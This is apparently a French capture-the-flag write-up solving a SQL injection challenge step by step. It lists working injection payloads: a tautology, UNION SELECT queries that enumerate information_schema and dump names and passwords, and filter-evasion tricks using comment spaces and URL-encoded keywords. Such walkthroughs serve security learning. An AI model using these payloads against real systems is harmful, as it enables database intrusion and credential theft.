Pour la première table le OR nous met sur la piste d'une sql :
'OR true#

on récupère le téléphone et l'adresse

Pour la seconde table :
'UNION SELECT table_name,null FROM information_schema.tables#
'UNION SELECT column_name,null FROM information_schema.columns WHERE table_name="Users"#
'UNION SELECT nom,prenom FROM Users#

on récuère le nom et le prénom

Pour la dernière table on connnait d'après la 1ère table le code de l'opération:
OpérationGorfou on obtient la date et l'heure.

Pour le mot de passe nous devons bypass des filtres d'où le FILTER dans le titre de la page:
/**/ pour bypass les espaces et %53NION pour bypass le UNION
'union/**/%53elect/**/table_name,null,null/**/from/**/information_schema.tables#
'union/**/%53elect/**/column_name,null,null/**/from/**/information_schema.columns/**/where/**/table_name="Password"#
'union/**/%53elect/**/mdp,null,null/**/from/**/Password#

on récupère le mot de passe
